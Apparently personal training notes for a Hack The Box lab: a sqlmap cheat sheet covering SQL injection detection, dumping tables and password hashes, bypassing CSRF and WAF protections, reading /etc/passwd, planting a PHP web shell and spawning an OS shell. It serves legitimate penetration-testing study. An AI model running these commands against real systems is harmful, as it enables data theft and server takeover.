# SQLMAP essentials

Check if the app is vunerable for sql injections:
```
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

Testing sql injections for a GET request is as simple as "copy as cURL" in developer tools and chaning curl with sqlMap:
```
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```


We can also save a request to a file (say `req.txt`)
```
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```
Then input this file to sqlmap:
```
sqlmap -r req.txt
```

Use the --batch & --dump flag to auto dump data if possible:
```
sqlmap -r req.txt --batch --dump
```

If we want to test this cookie header in the below POST request voor a sql injection:
```
GET /case3.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9,nl-NL;q=0.8,nl;q=0.7,en-US;q=0.6
Connection: keep-alive
Cookie: id=1*
Host: 94.237.53.134:51357
Referer: http://94.237.53.134:51357/case3.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
```
we just place the `*` where we wish to test for sql injections and then run:
```
sqlmap -r req.txt
```

## Troubleshooting sqlmap
For troubleshooting we can:
Print DB errors:
```
sqlmap -r req.txt --parse-errors
```
Or save all the traffice:
```
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

For a more in depth search of boundaries:
```
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

Specify the table you want to dump data for:
```
sqlmap -r req.txt --dump --batch --level 5 -T flag5 --risk 3
```

```
sqlmap -r req.txt --dump --batch --level 5 -T flag5 --risk 3
```
Specify amount of columns used in UNION ALL SQL injection to steal data:
```
sqlmap -r req.txt --dump --batch -T flag7 --union-cols=5
```

## Database enumeration
Once something has been detected we can start the enumeration process:
```
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

Retrieving the tables of a database:
```
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

Dumping the data of a specific table:
```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
We can also specify the columns of interest:
```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

We can also do conditional enumeration:
```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
We can also enumeate the entire schema of the db:
```
sqlmap -u "http://www.example.com/?id=1" --schema
```

Search for table LIKE users:
```
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

Search for a column LIKE pass:
```
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

Dump password hashes of the database users:
```
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

## Bypassing Web Application Protections

CSRF token bypass
```
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
Or for this POST-request:
```
POST /case8.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9,nl-NL;q=0.8,nl;q=0.7,en-US;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=can70f68tecpjp8enfoldqqrnf
Host: 94.237.120.137:58273
Origin: http://94.237.120.137:58273
Referer: http://94.237.120.137:58273/case8.php
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

id=1&t0ken=HKHUOiA7amNKjsxIZUQqkMdCRcB2txAJPhgp7mZGeVM
```
Run this command 
```
sqlmap -r req.txt --csrf-token t0ken
```

Unique value bypass
```
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

Calculated Parameter Bypass:
```
koen1992@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

User-agent Blacklisting Bypass
Set a random user-agent by adding the `--random-agent` parameter

Another usefull parameter can be `--chunked` where blacklisted keyword are split in the different chunks of the POST request.

Use of `--tamper` to change output before it is send (remove certain chars by other functionally the same constructs.. Like remove <> in favor of NOT BETWEEN 0 AND #):
```
sqlmap -u "http://94.237.120.137:58273/case11.php?id=1" --tamper=between -T flag11 --dump
```

## OS Exploitation

Check if we are `dba`:
```
sqlmap -u "http://www.example.com/?id=1" --is-dba
```

Attempt to read local files:
```
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

Attempt to write a webshell:
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
Then attempt to use the webshell:
```
curl http://www.example.com/shell.php?cmd=ls+-la
```

Or we can use `--os-shell` directly to check if we can run OS commands via sql (for example `xp_cmdshell` in sql server)

```
sqlmap -u "http://www.example.com/?id=1" --os-shell
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```





